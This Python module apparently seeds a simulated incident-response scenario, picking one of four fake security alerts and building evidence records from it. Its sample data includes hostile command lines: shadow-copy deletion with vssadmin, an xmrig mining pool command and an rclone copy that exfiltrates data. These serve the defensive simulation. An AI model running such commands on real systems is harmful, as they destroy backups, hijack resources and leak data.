from __future__ import annotations

from collections.abc import Mapping
from datetime import datetime
from ipaddress import IPv4Address
from uuid import uuid4

from shieldchain.incidents.domain import Evidence, EvidenceScalar, PhishingScenarioState
from shieldchain.incidents.integrity import create_evidence


def seed_phishing_scenario(now: datetime) -> PhishingScenarioState:
    import random
    scenarios = [
        {
            "external_incident_id": "INC-2026-0001",
            "alert_id": "ALT-2026-0001",
            "username": "zhangsan",
            "endpoint": "PC-023",
            "process_name": "powershell.exe",
            "parent_process_name": "WINWORD.EXE",
            "command_summary": "执行经过脱敏的编码脚本",
            "threat_label": "known-malicious-c2",
            "remote_ip": IPv4Address("198.51.100.24"),
        },
        {
            "external_incident_id": "INC-2026-0002",
            "alert_id": "ALT-2026-0002",
            "username": "lisi",
            "endpoint": "SRV-FILE-01",
            "process_name": "vssadmin.exe",
            "parent_process_name": "cmd.exe",
            "command_summary": "vssadmin.exe delete shadows /all /quiet",
            "threat_label": "ransomware-behavior",
            "remote_ip": IPv4Address("203.0.113.45"),
        },
        {
            "external_incident_id": "INC-2026-0003",
            "alert_id": "ALT-2026-0003",
            "username": "wangwu",
            "endpoint": "DB-PROD-01",
            "process_name": "xmrig.exe",
            "parent_process_name": "explorer.exe",
            "command_summary": "xmrig -o pool.minexmr.com:443",
            "threat_label": "crypto-miner",
            "remote_ip": IPv4Address("192.0.2.11"),
        },
        {
            "external_incident_id": "INC-2026-0004",
            "alert_id": "ALT-2026-0004",
            "username": "zhaoliu",
            "endpoint": "PC-088",
            "process_name": "rclone.exe",
            "parent_process_name": "powershell.exe",
            "command_summary": "rclone copy C:\\Data remote:backup",
            "threat_label": "unauthorized-exfiltration",
            "remote_ip": IPv4Address("104.244.42.193"),
        }
    ]
    
    choice = random.choice(scenarios)

    return PhishingScenarioState(
        simulation_id=uuid4(),
        generation=1,
        environment="simulation",
        incident_id=uuid4(),
        external_incident_id=choice["external_incident_id"],
        alert_id=choice["alert_id"],
        endpoint=choice["endpoint"],
        username=choice["username"],
        source_ip=IPv4Address("10.10.23.17"),
        alert_status="pending",
        remote_ip=choice["remote_ip"],
        remote_port=443,
        process_name=choice["process_name"],
        parent_process_name=choice["parent_process_name"],
        command_summary=choice["command_summary"],
        threat_label=choice["threat_label"],
        connection_status="active",
        firewall_status="not_blocked",
        fail_block_consumed=False,
        created_at=now,
        updated_at=now,
    )


def _evidence(
    *,
    evidence_type: str,
    source: str,
    observed_at: datetime,
    summary: str,
    raw_reference: str,
    confidence: float,
    payload: Mapping[str, EvidenceScalar],
) -> Evidence:
    return create_evidence(
        evidence_type=evidence_type,
        source=source,
        observed_at=observed_at,
        summary=summary,
        raw_reference=raw_reference,
        confidence=confidence,
        confirmed=True,
        payload=payload,
    )


def collect_evidence(
    state: PhishingScenarioState, now: datetime
) -> tuple[Evidence, ...]:
    remote_ip = str(state.remote_ip)
    endpoint = state.endpoint
    process_name = state.process_name
    return (
        _evidence(
            evidence_type="alert",
            source="simulated_siem",
            observed_at=now,
            summary=f"Pending {state.threat_label} alert for endpoint and user",
            raw_reference=f"simulation://alerts/{state.alert_id}",
            confidence=0.98,
            payload={
                "alert_id": state.alert_id,
                "status": state.alert_status,
                "endpoint": endpoint,
                "username": state.username,
            },
        ),
        _evidence(
            evidence_type="network_connection",
            source="simulated_edr",
            observed_at=now,
            summary="Active outbound connection from suspicious process",
            raw_reference=f"simulation://connections/{state.simulation_id}",
            confidence=0.98,
            payload={
                "source_ip": str(state.source_ip),
                "remote_ip": remote_ip,
                "remote_port": state.remote_port,
                "status": state.connection_status,
                "process_name": process_name,
            },
        ),
        _evidence(
            evidence_type="threat_intelligence",
            source="simulated_ti",
            observed_at=now,
            summary="Target IP is identified as malicious",
            raw_reference=f"simulation://threat-intel/{remote_ip}",
            confidence=1.0,
            payload={
                "remote_ip": remote_ip,
                "label": state.threat_label,
                "malicious": True,
            },
        ),
        _evidence(
            evidence_type="process",
            source="simulated_edr",
            observed_at=now,
            summary="Suspicious process observed on endpoint",
            raw_reference=f"simulation://processes/{endpoint}/{process_name}",
            confidence=0.98,
            payload={"endpoint": endpoint, "process_name": process_name},
        ),
        _evidence(
            evidence_type="parent_process",
            source="simulated_edr",
            observed_at=now,
            summary="Suspicious parent process launched the payload",
            raw_reference=f"simulation://processes/{endpoint}/{process_name}/parent",
            confidence=0.98,
            payload={
                "endpoint": endpoint,
                "process_name": process_name,
                "parent_process_name": state.parent_process_name,
            },
        ),
    )
